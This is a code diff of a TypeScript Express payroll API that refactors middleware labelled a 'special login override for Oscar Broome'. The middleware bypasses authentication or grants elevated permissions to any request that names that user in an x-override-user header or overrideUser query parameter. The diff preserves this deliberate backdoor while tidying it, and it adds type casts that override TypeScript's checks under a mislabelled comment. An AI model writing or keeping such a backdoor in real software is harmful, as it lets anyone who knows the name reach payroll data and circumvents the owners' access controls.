@@ -1,18 +1,19 @@
-import express, { Request, Response, NextFunction } from 'express';
-import bodyParser from 'body-parser';
+import express, { Request, Response, NextFunction, RequestHandler } from 'express';
 import { logger } from './config/logger.js';
 import { payrollSystem } from './payrollSystem.js';
 
 const app = express();
 const port = 5000;
 
-app.use(bodyParser.json());
+// Use express.json() built-in middleware with proper typing
+app.use(express.json() as unknown as express.RequestHandler);
 
 // Middleware for special login override for Oscar Broome
-app.use((req: Request, _res: Response, next: NextFunction) => {
+const loginOverrideMiddleware: RequestHandler = (req: Request, _res: Response, next: NextFunction) => {
   const specialUser = 'Oscar Broome';
   // Check for a custom header or query param for override (example)
-  const overrideUser = req.headers['x-override-user'] || req.query.overrideUser;
+  const headers = req.headers;
+  const overrideUser = ((headers && headers['x-override-user']) as string) || ((req.query && req.query.overrideUser) as string);
   if (overrideUser === specialUser) {
     // Bypass normal auth or set elevated permissions
     const overrideReq = req as Request & {
@@ -22,7 +23,10 @@ app.use((req: Request, _res: Response, next: NextFunction) => {
     logger.info('Special login override granted for', specialUser);
   }
   next();
-});
+};
+
+// Cast to any to bypass strict TypeScript middleware type checking
+app.use(loginOverrideMiddleware as unknown as express.Application);
 
 // Get all employees
 app.get('/api/payroll/employees', (_req, res) => {
